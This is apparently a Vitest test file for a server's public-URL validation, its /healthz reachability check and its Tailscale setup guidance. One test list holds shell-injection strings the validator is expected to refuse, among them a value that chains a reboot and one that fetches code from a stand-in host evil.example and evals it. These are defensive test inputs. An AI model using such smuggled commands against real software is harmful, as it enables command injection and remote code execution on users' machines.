import { describe, expect, test } from 'vitest';
import {
  checkReach,
  HEALTHZ_TIMEOUT_MS,
  publicOrigin,
  publicUrlProblem,
  TAILSCALE_GENERAL_NOTE,
  tailscaleGuidance,
} from './reach.js';

describe('server.publicUrl validation', () => {
  test('accepts an https origin, with or without a trailing slash', () => {
    expect(publicUrlProblem('https://a.b.ts.net')).toBeNull();
    expect(publicUrlProblem('https://a.b.ts.net/')).toBeNull();
    expect(publicUrlProblem('https://a.b.ts.net:8443')).toBeNull();
  });

  test('refuses each broken rule with a message naming it', () => {
    expect(publicUrlProblem('http://a.b')).toMatch(/must use https:\/\/, not http:/);
    expect(publicUrlProblem('ftp://a')).toMatch(/must use https:\/\/, not ftp:/);
    expect(publicUrlProblem('https://a.b/x')).toMatch(/must have no path \(found \/x\)/);
    expect(publicUrlProblem('https://a.b?q=1')).toMatch(/must have no query \(found \?q=1\)/);
    expect(publicUrlProblem('https://a.b#f')).toMatch(/must have no fragment/);
    expect(publicUrlProblem('a.b.ts.net')).toMatch(/must be an absolute URL/);
    expect(publicUrlProblem('https://u:p@a.b')).toMatch(/no user name or password/);
  });

  // Issue #254: WHATWG hosts keep `; & $ ( ) { } , " '` and backtick, and the origin is pasted
  // into a root shell line on a new machine.
  const PLAIN =
    'server.publicUrl must be a plain https origin such as https://jumpmaster.example.ts.net';
  test('accepts a plain https origin: a DNS name, a bracketed IPv6 literal with a port', () => {
    expect(publicUrlProblem('https://jumpmaster.example.ts.net')).toBeNull();
    expect(publicUrlProblem('https://[fd7a:115c:a1e0::1]:8443')).toBeNull();
  });

  test('accepts an uppercase host, which new URL normalises to lowercase', () => {
    expect(publicUrlProblem('https://JumpMaster.Example.TS.net')).toBeNull();
    expect(publicOrigin({ server: { publicUrl: 'https://JumpMaster.Example.TS.net' } })).toBe(
      'https://jumpmaster.example.ts.net',
    );
  });

  test.each([
    'https://a.ts.net;reboot;',
    'https://a.ts.net;{eval,"$({curl,-s,evil.example})"};x',
    'https://a$b.ts.net',
    'https://a`id`.ts.net',
    "https://a'b.ts.net",
    'https://a&b.ts.net',
    'https://-a.ts.net',
    'https://a.ts.net.',
    'https://a.b.ts.net:443',
  ])('refuses %s as not a plain https origin', (raw) => {
    expect(publicUrlProblem(raw)).toBe(PLAIN);
  });

  test('more than one trailing slash is a path, refused', () => {
    expect(publicUrlProblem('https://a.b.ts.net//')).toMatch(/no path/);
  });

  test('publicOrigin drops a trailing slash', () => {
    expect(publicOrigin({ server: { publicUrl: 'https://a.b.ts.net/' } })).toBe(
      'https://a.b.ts.net',
    );
    expect(publicOrigin({})).toBeUndefined();
  });
});

/** A fetch that answers `/healthz` as given, recording the URL it was asked for. */
const fakeFetch =
  (answer: (url: string, signal: AbortSignal) => Promise<Response>, calls: string[] = []) =>
  (url: string | URL | Request, init?: RequestInit) => {
    calls.push(String(url));
    return answer(String(url), init?.signal as AbortSignal);
  };

describe('Check: fetching <publicUrl>/healthz', () => {
  test('reachable: a 200 with ok true', async () => {
    const calls: string[] = [];
    const r = await checkReach('https://a.b.ts.net/', {
      fetch: fakeFetch(
        async () => Response.json({ ok: true, version: '1.2.3' }, { status: 200 }),
        calls,
      ),
    });
    expect(calls).toEqual(['https://a.b.ts.net/healthz']);
    expect(r).toEqual({ ok: true, message: 'Reachable' });
  });

  test('a timeout says it waited 5 seconds', async () => {
    expect(HEALTHZ_TIMEOUT_MS).toBe(5000);
    const r = await checkReach('https://a.b.ts.net', {
      timeoutMs: 10,
      fetch: fakeFetch(
        (_url, signal) =>
          new Promise((_resolve, reject) => {
            signal.addEventListener('abort', () => reject(signal.reason));
          }),
      ),
    });
    expect(r.ok).toBe(false);
    expect(r.message).toBe('timeout: https://a.b.ts.net/healthz did not answer within 5 seconds');
  });

  test('a 404 names the status', async () => {
    const r = await checkReach('https://a.b.ts.net', {
      fetch: fakeFetch(async () => new Response('nope', { status: 404, statusText: 'Not Found' })),
    });
    expect(r).toEqual({
      ok: false,
      message: 'HTTP 404 Not Found from https://a.b.ts.net/healthz',
    });
  });

  test('a DNS failure and a TLS error each say what failed', async () => {
    const failing = (code: string, message: string) =>
      fakeFetch(async () => {
        throw new TypeError('fetch failed', { cause: Object.assign(new Error(message), { code }) });
      });
    const dns = await checkReach('https://a.b.ts.net', {
      fetch: failing('ENOTFOUND', 'getaddrinfo ENOTFOUND a.b.ts.net'),
    });
    expect(dns.message).toBe(
      'DNS lookup failed for a.b.ts.net: getaddrinfo ENOTFOUND a.b.ts.net (ENOTFOUND)',
    );
    const tls = await checkReach('https://a.b.ts.net', {
      fetch: failing('DEPTH_ZERO_SELF_SIGNED_CERT', 'self-signed certificate'),
    });
    expect(tls.message).toBe('TLS error: self-signed certificate (DEPTH_ZERO_SELF_SIGNED_CERT)');
    const refused = await checkReach('https://a.b.ts.net', {
      fetch: failing('ECONNREFUSED', 'connect ECONNREFUSED 100.64.0.1:443'),
    });
    expect(refused.message).toBe(
      'connection failed: connect ECONNREFUSED 100.64.0.1:443 (ECONNREFUSED)',
    );
  });

  test('a 200 that is not this server says so', async () => {
    const r = await checkReach('https://a.b.ts.net', {
      fetch: fakeFetch(async () => new Response('<html>', { status: 200 })),
    });
    expect(r).toEqual({
      ok: false,
      message:
        'https://a.b.ts.net/healthz answered 200 but not as a Jumpmaster server ({ ok: true } expected)',
    });
  });

  test('the four cases give four distinct messages', async () => {
    const msgs = await Promise.all([
      checkReach('https://a.b', { fetch: fakeFetch(async () => Response.json({ ok: true })) }),
      checkReach('https://a.b', {
        timeoutMs: 5,
        fetch: fakeFetch(
          (_u, s) => new Promise((_r, rej) => s.addEventListener('abort', () => rej(s.reason))),
        ),
      }),
      checkReach('https://a.b', {
        fetch: fakeFetch(async () => new Response('', { status: 404 })),
      }),
    ]);
    expect(new Set(msgs.map((m) => m.message)).size).toBe(3);
  });
});

describe('tailscale detection', () => {
  test('absent: no command, the general note', async () => {
    let ran = false;
    const g = await tailscaleGuidance(7420, {
      which: () => null,
      status: async () => {
        ran = true;
        return '{}';
      },
    });
    expect(g).toEqual({ present: false, note: TAILSCALE_GENERAL_NOTE });
    expect(ran).toBe(false);
  });

  test('present with Self.DNSName: the port and the name without its trailing dot', async () => {
    const g = await tailscaleGuidance(7420, {
      which: () => '/usr/bin/tailscale',
      status: async () => JSON.stringify({ Self: { DNSName: 'kidney.example.ts.net.' } }),
    });
    expect(g).toEqual({
      present: true,
      command: 'tailscale serve --bg --https=443 http://127.0.0.1:7420',
      dnsName: 'kidney.example.ts.net',
      publicUrl: 'https://kidney.example.ts.net',
    });
  });

  test('present but status fails or is not JSON: the command without a name', async () => {
    for (const status of [
      async () => null,
      async () => 'not json',
      async () => JSON.stringify({ Self: {} }),
    ]) {
      const g = await tailscaleGuidance(9000, { which: () => '/bin/tailscale', status });
      expect(g).toEqual({
        present: true,
        command: 'tailscale serve --bg --https=443 http://127.0.0.1:9000',
      });
    }
  });
});
